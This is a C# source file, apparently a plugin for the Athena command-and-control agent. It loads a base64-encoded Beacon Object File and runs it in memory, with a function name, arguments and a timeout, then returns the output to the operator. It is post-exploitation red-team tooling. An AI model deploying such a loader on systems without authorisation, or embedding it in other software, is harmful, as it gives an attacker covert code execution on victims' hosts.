using Athena.Plugins;
using System;
using System.Collections.Generic;
using System.IO;
using coff.coff;
namespace Plugins
{
    public class Coff : AthenaPlugin
    {
        public override string Name => "coff";
        public override void Execute(Dictionary<string, string> args)
        {
            try
            {
                //Need Args
                // asm - base64 encoded buffer of bof
                // functionName - name of function to be called
                // arguments - base64 encoded byteArray of bof arguments from beacon generate
                // timeout - timeout for thread to wait before killing bof execution (in seconds)


                //args.Add("asm", Convert.ToBase64String(File.ReadAllBytes(@"C:\Users\scott\Downloads\dir.x64.o")));
                ////string blah = Convert.ToBase64String(new byte[] { 0x00, 0x00 });
                //var blah2 = Convert.FromBase64String("CAAAAAQAAABDOlwA");
                //var blah3 = blah2.ToList();
                //blah3.Add(0x00);
                //blah3.Add(0x00);
                //var blah4 = Convert.ToBase64String(blah3.ToArray());
                //args.Add("arguments", blah4);
                //args.Add("functionName", "go");
                //args.Add("timeout", "30");
                //args.Add("task-id", "1");
                BofRunner br = new BofRunner(args);
                br.LoadBof();
                BofRunnerOutput bro = br.RunBof(30);
                PluginHandler.Write(bro.Output, args["task-id"], true);
            }
            catch (Exception e)
            {
                PluginHandler.Write(e.ToString(), args["task-id"], true, "error");
            }
        }
    }
}
